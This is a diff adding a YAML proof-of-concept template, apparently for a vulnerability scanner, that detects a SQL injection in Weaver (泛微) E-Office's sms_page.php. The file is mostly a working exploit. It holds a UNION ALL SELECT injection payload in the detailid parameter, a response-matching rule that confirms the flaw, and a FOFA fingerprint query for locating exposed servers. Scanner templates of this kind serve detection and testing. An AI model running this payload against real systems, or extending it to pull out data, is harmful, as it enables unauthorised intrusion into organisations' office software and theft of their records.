@@ -1,0 +1,17 @@
+id: poc-yaml-weaver-e-office-sms-page-php-sqli
+info:
+  name: 泛微OA E-Office sms_page.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: e-office
+  fofa: body="/general/login/view//images/updateLoad.gif"
+variables:
+  t1: random_int(100,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /E-mobile/sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x3a,md5({{.t1}}),0x3a),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+  expression: status_code == 200 && contains(body,t2) && contains(body,"未知消息")
+transport: http
